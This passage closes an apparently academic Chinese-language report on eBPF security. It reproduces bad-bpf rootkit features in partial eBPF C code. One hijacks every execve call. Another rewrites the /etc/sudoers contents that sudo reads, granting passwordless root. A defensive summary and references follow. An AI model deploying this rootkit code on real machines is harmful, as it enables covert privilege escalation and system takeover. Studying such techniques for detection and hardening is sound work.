<p><span>exechijack<span class="heti-spacing"> </span></span>程序会劫持所有用于创建新进程的<span class="heti-skip"><span class="heti-spacing"> </span>execve<span class="heti-spacing"> </span></span>系统调用，转而调用<span><span class="heti-spacing"> </span>/a</span>，即只输出<span class="heti-skip"><span class="heti-spacing"> </span>uid<span class="heti-spacing"> </span></span>和<span><span class="heti-spacing"> </span>argv[0]</span>：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-32-1" id="__codelineno-32-1" name="__codelineno-32-1"></a><span class="n">SEC</span><span class="p">(</span><span class="s">"tp/syscalls/sys_enter_execve"</span><span class="p">)</span>
<a href="#__codelineno-32-2" id="__codelineno-32-2" name="__codelineno-32-2"></a><span class="kt">int</span><span class="w"> </span><span class="n">handle_execve_enter</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">trace_event_raw_sys_enter</span><span class="w"> </span><span class="o">*</span><span class="n">ctx</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-32-3" id="__codelineno-32-3" name="__codelineno-32-3"></a><span class="w">    </span><span class="err">···</span>
<a href="#__codelineno-32-4" id="__codelineno-32-4" name="__codelineno-32-4"></a><span class="w">    </span><span class="c1">// 读取当前 execve 系统调用新建的进程信息</span>
<a href="#__codelineno-32-5" id="__codelineno-32-5" name="__codelineno-32-5"></a><span class="w">    </span><span class="n">bpf_probe_read_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">prog_name</span><span class="p">,</span><span class="w"> </span><span class="n">TASK_COMM_LEN</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<a href="#__codelineno-32-6" id="__codelineno-32-6" name="__codelineno-32-6"></a><span class="w">    </span><span class="n">bpf_probe_read_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">prog_name_orig</span><span class="p">,</span><span class="w"> </span><span class="n">TASK_COMM_LEN</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<a href="#__codelineno-32-7" id="__codelineno-32-7" name="__codelineno-32-7"></a>
<a href="#__codelineno-32-8" id="__codelineno-32-8" name="__codelineno-32-8"></a><span class="w">    </span><span class="c1">// 修改程序路径为 /a</span>
<a href="#__codelineno-32-9" id="__codelineno-32-9" name="__codelineno-32-9"></a><span class="w">    </span><span class="n">prog_name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">'/'</span><span class="p">;</span>
<a href="#__codelineno-32-10" id="__codelineno-32-10" name="__codelineno-32-10"></a><span class="w">    </span><span class="n">prog_name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">'a'</span><span class="p">;</span>
<a href="#__codelineno-32-11" id="__codelineno-32-11" name="__codelineno-32-11"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">TASK_COMM_LEN</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-32-12" id="__codelineno-32-12" name="__codelineno-32-12"></a><span class="w">        </span><span class="n">prog_name</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">'\x00'</span><span class="p">;</span>
<a href="#__codelineno-32-13" id="__codelineno-32-13" name="__codelineno-32-13"></a><span class="w">    </span><span class="p">}</span>
<a href="#__codelineno-32-14" id="__codelineno-32-14" name="__codelineno-32-14"></a><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bpf_probe_write_user</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="o">&amp;</span><span class="n">prog_name</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">);</span>
<a href="#__codelineno-32-15" id="__codelineno-32-15" name="__codelineno-32-15"></a><span class="w">    </span><span class="err">···</span>
<a href="#__codelineno-32-16" id="__codelineno-32-16" name="__codelineno-32-16"></a><span class="p">}</span>
</code></pre></div>
<p>运行<span class="heti-skip"><span class="heti-spacing"> </span>exechijack<span class="heti-spacing"> </span></span>程序后，所有新进程都会被劫持转而运行<span><span class="heti-spacing"> </span>/a</span>：</p>
<div style="text-align: center;">
<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="/assets/images/sec/syssec/project/img8.png"><img src="/assets/images/sec/syssec/project/img8.png" style="margin: 0 auto;" width="90%"/></a>
</div>
<h4 id="_7">用户提权<a class="headerlink" href="#_7" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h4>
<p><span>sudo<span class="heti-spacing"> </span></span>命令在执行时会读取 <code>/etc/sudoers</code> 文件，查询其中的权限，查询当前执行命令的用户是否有<span class="heti-skip"><span class="heti-spacing"> </span>sudo<span class="heti-spacing"> </span></span>权限，是否需要密码等。我们可以拦截<span class="heti-skip"><span class="heti-spacing"> </span>sudo<span class="heti-spacing"> </span></span>对 <code>/etc/sudoers</code> 文件的读取，并用 <code>ALL=(ALL:ALL) NOPASSWD:ALL #</code> 覆盖第一行，使<span class="heti-skip"><span class="heti-spacing"> </span>sudo<span class="heti-spacing"> </span></span>认为该用户可以不需要密码执行<span class="heti-skip"><span class="heti-spacing"> </span>sudo<span class="heti-spacing"> </span></span>命令，从而实现用户提权。</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-33-1" id="__codelineno-33-1" name="__codelineno-33-1"></a><span class="n">SEC</span><span class="p">(</span><span class="s">"tp/syscalls/sys_exit_read"</span><span class="p">)</span>
<a href="#__codelineno-33-2" id="__codelineno-33-2" name="__codelineno-33-2"></a><span class="kt">int</span><span class="w"> </span><span class="n">handle_read_exit</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">trace_event_raw_sys_exit</span><span class="w"> </span><span class="o">*</span><span class="n">ctx</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-33-3" id="__codelineno-33-3" name="__codelineno-33-3"></a><span class="w">    </span><span class="err">···</span><span class="w">     </span><span class="c1">// 写入用户名</span>
<a href="#__codelineno-33-4" id="__codelineno-33-4" name="__codelineno-33-4"></a><span class="w">    </span><span class="n">sprintf</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">rodata</span><span class="o">-&gt;</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="s">"%s ALL=(ALL:ALL) NOPASSWD:ALL #"</span><span class="p">,</span><span class="w"> </span><span class="n">env</span><span class="p">.</span><span class="n">username</span><span class="p">);</span><span class="w"> </span>
<a href="#__codelineno-33-5" id="__codelineno-33-5" name="__codelineno-33-5"></a><span class="w">    </span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">rodata</span><span class="o">-&gt;</span><span class="n">payload_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">rodata</span><span class="o">-&gt;</span><span class="n">payload</span><span class="p">);</span>
<a href="#__codelineno-33-6" id="__codelineno-33-6" name="__codelineno-33-6"></a><span class="w">    </span><span class="err">···</span><span class="w">     </span><span class="c1">// 修改 /etc/sudoers 文件内容，并在修改内容后加上 # 注释</span>
<a href="#__codelineno-33-7" id="__codelineno-33-7" name="__codelineno-33-7"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">local_buff</span><span class="p">[</span><span class="n">max_payload_len</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mh">0x00</span><span class="w"> </span><span class="p">};</span>
<a href="#__codelineno-33-8" id="__codelineno-33-8" name="__codelineno-33-8"></a><span class="w">    </span><span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_buff</span><span class="p">,</span><span class="w"> </span><span class="n">max_payload_len</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">buff_addr</span><span class="p">);</span>
<a href="#__codelineno-33-9" id="__codelineno-33-9" name="__codelineno-33-9"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">max_payload_len</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-33-10" id="__codelineno-33-10" name="__codelineno-33-10"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">payload_len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">local_buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">'#'</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<a href="#__codelineno-33-11" id="__codelineno-33-11" name="__codelineno-33-11"></a><span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">local_buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w"> </span><span class="p">}</span>
<a href="#__codelineno-33-12" id="__codelineno-33-12" name="__codelineno-33-12"></a><span class="w">    </span><span class="p">}</span>
<a href="#__codelineno-33-13" id="__codelineno-33-13" name="__codelineno-33-13"></a><span class="w">    </span><span class="c1">// 写入修改后的内容</span>
<a href="#__codelineno-33-14" id="__codelineno-33-14" name="__codelineno-33-14"></a><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bpf_probe_write_user</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">buff_addr</span><span class="p">,</span><span class="w"> </span><span class="n">local_buff</span><span class="p">,</span><span class="w"> </span><span class="n">max_payload_len</span><span class="p">);</span>
<a href="#__codelineno-33-15" id="__codelineno-33-15" name="__codelineno-33-15"></a><span class="w">    </span><span class="err">···</span>
<a href="#__codelineno-33-16" id="__codelineno-33-16" name="__codelineno-33-16"></a><span class="p">}</span>
</code></pre></div>
<p>我们可以先尝试进行 <code>sudo ls</code>，可见低权限用户无法使用<span class="heti-skip"><span class="heti-spacing"> </span>sudo<span class="heti-spacing"> </span></span>命令：</p>
<div style="text-align: center;">
<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="/assets/images/sec/syssec/project/img9.png"><img src="/assets/images/sec/syssec/project/img9.png" style="margin: 0 auto;" width="40%"/></a>
</div>
<p>然后运行了<span class="heti-skip"><span class="heti-spacing"> </span>sudoadd<span class="heti-spacing"> </span></span>程序后，就可以执行<span class="heti-skip"><span class="heti-spacing"> </span>sudo<span class="heti-spacing"> </span></span>命令了：</p>
<div style="text-align: center;">
<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="/assets/images/sec/syssec/project/img10.png"><img src="/assets/images/sec/syssec/project/img10.png" style="margin: 0 auto;" width="100%"/></a>
</div>
<h2 id="_8">总结<a class="headerlink" href="#_8" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
<p>通过以上对于<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>内核漏洞以及<span class="heti-skip"><span class="heti-spacing"> </span>eBPF rootkit<span class="heti-spacing"> </span></span>的分析可以看出，<span>eBPF<span class="heti-spacing"> </span></span>技术在为<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>内核引入了丰富可扩展的子系统功能的同时，也引入了很大的安全风险。<span>eBPF<span class="heti-spacing"> </span></span>程序可以在内核态执行，可以访问内核数据结构，可以劫持系统调用，可以隐藏进程，可以劫持新建进程，可以提权等，这些功能都为攻击者提供了很大的空间。</p>
<p>通过对于<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>现有的<span class="heti-skip"><span class="heti-spacing"> </span>CVE<span class="heti-spacing"> </span></span>漏洞进行分析，我们也得到了大部分漏洞出现于<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>上的结论，所以为了提高<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>安全性，我们要在增加<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>功能的同时，增加对于<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>代码的审计和<span class="heti-skip"><span class="heti-spacing"> </span>fuzz<span class="heti-spacing"> </span></span>测试，尽量减少<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>本身出现漏洞的可能。</p>
<p>同时对于<span class="heti-skip"><span class="heti-spacing"> </span>eBPF rootkit<span class="heti-spacing"> </span></span>的威胁，一方面可以增强对于<span class="heti-skip"><span class="heti-spacing"> </span>bpf<span class="heti-spacing"> </span></span>系统调用以及<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序执行的更多权限检查，另一方面“解铃还需系铃人”，虽然<span class="heti-skip"><span class="heti-spacing"> </span>eBPF rootkit<span class="heti-spacing"> </span></span>难以通过已有手段探测，但是却可以通过<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序来寻找<span class="heti-skip"><span class="heti-spacing"> </span>eBPF rootkit<span class="heti-spacing"> </span></span>存在的蛛丝马迹，也可以更广泛的探测其他<span class="heti-skip"><span class="heti-spacing"> </span>rootkit<span class="heti-spacing"> </span></span>的存在，实现内核的保护，但这就不是本文的重点了。</p>
<p>总结一下，本文首先介绍了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>技术的来源与发展，接下来介绍了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>技术的基本原理和安全设计，然后我们分析了几个<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>中出现的严重提权<span class="heti-skip"><span class="heti-spacing"> </span>CVE<span class="heti-spacing"> </span></span>漏洞的原理，并详细分析了<span class="heti-skip"><span class="heti-spacing"> </span>CVE-2020-8835<span class="heti-spacing"> </span></span>漏洞的提权利用过程，再分析了其他<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>历史<span class="heti-skip"><span class="heti-spacing"> </span>CVE<span class="heti-spacing"> </span></span>的漏洞位置分布。另一方面我们介绍了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF rootkit<span class="heti-spacing"> </span></span>的原理，复现了<span class="heti-skip"><span class="heti-spacing"> </span>bad-bpf rootkit<span class="heti-spacing"> </span></span>包中的<span><span class="heti-spacing"> </span>pidhide</span>、exechijack、<span>sudoadd<span class="heti-spacing"> </span></span>功能，展示了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF rootkit<span class="heti-spacing"> </span></span>的危害性，并总结了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>相关的安全发展。</p>
<h2 id="_9">参考文献及资料<a class="headerlink" href="#_9" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
<div class="reference">
<ol>
<li>MCCANNE S, JACOBSON V. The BSD packet filter: a new architecture for user-level packet capture[C]//Proceedings of the USENIX Winter 1993 Conference Proceedings on USENIX Winter 1993 Conference Proceedings. USA: USENIX Association, 1993: 2[2024-06-13].</li>
<li>MOHAMED M H N, WANG X, RAVINDRAN B. Understanding the Security of Linux eBPF Subsystem[C/OL]//Proceedings of the 14th ACM SIGOPS Asia-Pacific Workshop on Systems. New York, NY, USA: Association for Computing Machinery, 2023: 87-92[2024-06-14]. <a href="https://dl.acm.org/doi/10.1145/3609510.3609822">https://dl.acm.org/doi/10.1145/3609510.3609822</a>.</li>
<li><span>CASSAGNES C, TRESTIOREANU L, JOLY C,<span class="heti-spacing"> </span></span>等<span><span class="heti-spacing"> </span>. The rise of eBPF for non-intrusive performance monitoring[C/OL]//NOMS 2020 - 2020 IEEE/IFIP Network Operations and Management Symposium. 2020: 1-7[2024-05-08].</span><a href="https://ieeexplore.ieee.org/document/9110434"><span><span class="heti-spacing"> </span>https://ieeexplore.ieee.org/document/9110434</span></a><span><span class="heti-spacing"> </span>.</span></li>
<li>HEDAM N. eBPF - From a Programmer’s Perspective[C/OL]. 2021[2024-05-08]. <a href="https://www.semanticscholar.org/paper/eBPF-From-a-Programmer%E2%80%99s-Perspective-Hedam/fa841bd12df684991c5e0273bf7befd997131bd0">https://www.semanticscholar.org/paper/eBPF-From-a-Programmer%E2%80%99s-Perspective-Hedam/fa841bd12df684991c5e0273bf7befd997131bd0</a>.</li>
<li>SHARAF H, AHMAD I, DIMITRIOU T. Extended Berkeley Packet Filter: An Application Perspective[J/OL]. IEEE Access, 2022, 10: 126370-126393. <a href="https://doi.org/10.1109/ACCESS.2022.3226269">https://doi.org/10.1109/ACCESS.2022.3226269</a>.</li>
<li><span>NELSON L, GEFFEN J V, TORLAK E,<span class="heti-spacing"> </span></span>等<span><span class="heti-spacing"> </span>. Specification and verification in the field: Applying formal methods to {BPF} just-in-time compilers in the Linux kernel[C/OL]//14th USENIX Symposium on Operating Systems Design and Implementation (OSDI 20). 2020: 41-61[2024-05-08].</span><a href="https://www.usenix.org/conference/osdi20/presentation/nelson"><span><span class="heti-spacing"> </span>https://www.usenix.org/conference/osdi20/presentation/nelson</span></a><span><span class="heti-spacing"> </span>.</span></li>
<li>Introduction and practice of eBPF[EB/OL]. (2022-04-13)[2024-06-14]. <a href="https://www.sobyte.net/post/2022-04/ebpf/">https://www.sobyte.net/post/2022-04/ebpf/</a>.</li>
<li>Dive into BPF: a list of reading material[EB/OL]. (2016-07-01)[2024-06-14]. <a href="https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/">https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/</a>.</li>
<li>What is eBPF? An Introduction and Deep Dive into the eBPF Technology[EB/OL]. [2024-06-14]. <a href="https://ebpf.io/what-is-ebpf/">https://ebpf.io/what-is-ebpf/</a>.</li>
<li>NVD - CVE-2020-8835[EB/OL]. [2024-06-14]. <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8835">https://nvd.nist.gov/vuln/detail/CVE-2020-8835</a>.</li>
<li>Zero Day Initiative — CVE-2020-8835: Linux Kernel Privilege Escalation via Improper eBPF Program Verification[EB/OL]. [2024-06-14]. <a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification</a>.</li>
<li>CVE-2020-8835：<span>eBPF verifier<span class="heti-spacing"> </span></span>整数截断导致越界读写<span><span class="heti-spacing"> </span>- bsauce[EB/OL]. [2024-06-15].</span><a href="https://www.cnblogs.com/bsauce/p/14123111.html"><span><span class="heti-spacing"> </span>https://www.cnblogs.com/bsauce/p/14123111.html</span></a><span><span class="heti-spacing"> </span>.</span> </li>
<li>BSAUCE. bsauce/kernel-exploit-factory[CP/OL]. (2024-06-14)[2024-06-15]. <a href="https://github.com/bsauce/kernel-exploit-factory">https://github.com/bsauce/kernel-exploit-factory</a>.  </li>
<li>NVD - CVE-2020-27194[EB/OL]. [2024-06-14]. <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-27194">https://nvd.nist.gov/vuln/detail/CVE-2020-27194</a>.</li>
<li>Fuzzing for eBPF JIT bugs in the Linux kernel[EB/OL]//Simon Scannell. (2020-11-01)[2024-06-14]. <a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/</a>.</li>
<li>CVE-2020-27194：<span>Linux Kernel eBPF<span class="heti-spacing"> </span></span>模块提权漏洞的分析与利用<span><span class="heti-spacing"> </span>- 360CERT[EB/OL]. [2024-06-14].</span><a href="https://cert.360.cn/report/detail?id=534ffa63f950368b6741a1781173b242"><span><span class="heti-spacing"> </span>https://cert.360.cn/report/detail?id=534ffa63f950368b6741a1781173b242</span></a><span><span class="heti-spacing"> </span>.</span></li>
<li>NVD - CVE-2021-3490[EB/OL]. [2024-06-15]. <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3490">https://nvd.nist.gov/vuln/detail/CVE-2021-3490</a>.</li>
<li>Kernel Pwning with eBPF - a Love Story - chompie at the bits[EB/OL]. [2024-06-15]. <a href="https://chomp.ie/Blog+Posts/Kernel+Pwning+with+eBPF+-+a+Love+Story">https://chomp.ie/Blog+Posts/Kernel+Pwning+with+eBPF+-+a+Love+Story</a>.</li>
<li>CHOMPIE. chompie1337/Linux_LPE_eBPF_CVE-2021-3490[CP/OL]. (2024-06-07)[2024-06-15]. <a href="https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490">https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490</a>.</li>
<li><span>CVE-2021-3490 eBPF 32<span class="heti-spacing"> </span></span>位边界计算错误漏洞利用分析<span class="heti-skip"><span class="heti-spacing"> </span>-<span class="heti-spacing"> </span></span>安全客<span><span class="heti-spacing"> </span>[EB/OL]. [2024-06-15].</span><a href="https://www.anquanke.com/post/id/251933"><span><span class="heti-spacing"> </span>https://www.anquanke.com/post/id/251933</span></a><span><span class="heti-spacing"> </span>.</span></li>
<li>NVD - CVE-2022-23222[EB/OL]. [2024-06-15]. <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23222">https://nvd.nist.gov/vuln/detail/CVE-2022-23222</a>.</li>
<li>oss-security - Re: Linux Kernel eBPF Improper Input Validation Vulnerability[EB/OL]. [2024-06-15]. <a href="https://www.openwall.com/lists/oss-security/2022/01/18/2">https://www.openwall.com/lists/oss-security/2022/01/18/2</a>.</li>
<li>TR3E. cve-2022-23222-linux-kernel-ebpf-lpe[EB/OL]. [2024-06-15]. <a href="https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt">https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt</a>.</li>
<li>TR3E. tr3ee/CVE-2022-23222[CP/OL]. (2024-05-15)[2024-06-15]. <a href="https://github.com/tr3ee/CVE-2022-23222">https://github.com/tr3ee/CVE-2022-23222</a>.</li>
<li><span>MEANWHILE. Linux<span class="heti-spacing"> </span></span>内核<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>权限提升漏洞复现<span class="heti-skip"><span class="heti-spacing"> </span>(CVE-2022-23222)[EB/OL]//<span class="heti-spacing"> </span></span>星期五实验室<span><span class="heti-spacing"> </span>. [2024-06-15].</span><a href="https://mp.weixin.qq.com/s/QJz9so27ao4rmT1Sbp74KA"><span><span class="heti-spacing"> </span>https://mp.weixin.qq.com/s/QJz9so27ao4rmT1Sbp74KA</span></a></li>
<li>NVD - CVE-2021-4204[EB/OL]. [2024-06-15]. <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4204">https://nvd.nist.gov/vuln/detail/CVE-2021-4204</a>.</li>
<li>oss-security - Re: CVE-2021-4204: Linux Kernel eBPF Improper Input Validation Vulnerability[EB/OL]. [2024-06-15]. <a href="https://www.openwall.com/lists/oss-security/2022/01/18/1">https://www.openwall.com/lists/oss-security/2022/01/18/1</a>.</li>
<li>TR3E. tr3ee/CVE-2021-4204[CP/OL]. (2024-02-23)[2024-06-15]. <a href="https://github.com/tr3ee/CVE-2021-4204">https://github.com/tr3ee/CVE-2021-4204</a>.</li>
<li>NVD - eBPF Search Results[EB/OL]. [2024-06-15]. <a href="https://nvd.nist.gov/vuln/search/results?isCpeNameSearch=false&amp;query=eBPF&amp;results_type=overview&amp;form_type=Basic&amp;search_type=all&amp;startIndex=0">https://nvd.nist.gov/vuln/search/results?isCpeNameSearch=false&amp;query=eBPF&amp;results_type=overview&amp;form_type=Basic&amp;search_type=all&amp;startIndex=0</a>.</li>
<li><span>JIA J, ZHU Y, WILLIAMS D,<span class="heti-spacing"> </span></span>等<span><span class="heti-spacing"> </span>. Programmable System Call Security with eBPF[M/OL]. arXiv, 2023[2024-06-15].</span><a href="http://arxiv.org/abs/2302.10366"><span><span class="heti-spacing"> </span>http://arxiv.org/abs/2302.10366</span></a><span><span class="heti-spacing"> </span>.</span></li>
<li><span>DEJAEGHERE J, GBADAMOSI B, PULLS T,<span class="heti-spacing"> </span></span>等<span><span class="heti-spacing"> </span>. Comparing Security in eBPF and WebAssembly[C/OL]//Proceedings of the 1st Workshop on eBPF and Kernel Extensions. New York, NY, USA: Association for Computing Machinery, 2023: 35-41[2024-06-14].</span><a href="https://dl.acm.org/doi/10.1145/3609021.3609306"><span><span class="heti-spacing"> </span>https://dl.acm.org/doi/10.1145/3609021.3609306</span></a><span><span class="heti-spacing"> </span>.</span></li>
<li><span>Linux<span class="heti-spacing"> </span></span>中基于<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>的恶意利用与检测机制<span class="heti-skip"><span class="heti-spacing"> </span>-<span class="heti-spacing"> </span></span>美团技术团队<span><span class="heti-spacing"> </span>[EB/OL]. [2024-05-08].</span><a href="https://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html"><span><span class="heti-spacing"> </span>https://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html</span></a><span><span class="heti-spacing"> </span>.</span></li>
<li>FOURNIER G, BAUBEAU S. With Friends like eBPF, who needs enemies ?[J/OL]. (2021)[2024-05-08]. <a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-With-Friends-Like-EBPF-Who-Needs-Enemies.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-With-Friends-Like-EBPF-Who-Needs-Enemies.pdf</a></li>
<li>PAT_H/TO/FILE. pathtofile/bad-bpf[CP/OL]. (2024-06-03)[2024-06-16]. <a href="https://github.com/pathtofile/bad-bpf">https://github.com/pathtofile/bad-bpf</a>.</li>
<li>TREMB1E. ebpf-rootkit-and-detection[EB/OL]//Tremb1e’s Blog. (2022-04-17)[2024-06-16]. <a href="https://www.tremb1e.com/archives/ebpf-rootkit-and-detection">https://www.tremb1e.com/archives/ebpf-rootkit-and-detection</a>.  </li>
<li>DEF CON 29 - PatH - Warping Reality: Creating and Countering the Next Generation of Linux Rootkits - YouTube[EB/OL]. [2024-06-16]. <a href="https://www.youtube.com/watch?v=g6SKWT7sROQ">https://www.youtube.com/watch?v=g6SKWT7sROQ</a>.  </li>
<li>DEF CON 29: Bad BPF - Warping reality using eBPF[EB/OL]//pat_h/to/file. (2021-08-01)[2024-06-16]. <a href="https://blog.tofile.dev/2021/08/01/bad-bpf.html">https://blog.tofile.dev/2021/08/01/bad-bpf.html</a>.</li>
</ol>
</div>
<div class="hr-before-source-file"><hr/></div>
<aside class="md-source-file">
<span class="md-source-file__fact">
<span class="md-icon" title="最后更新">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
</span>
<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime" title="2024年9月16日 00:56:42 CST">2024年9月16日 00:56:42</span>
</span>
<span class="md-source-file__fact">
<span class="md-icon" title="创建日期">
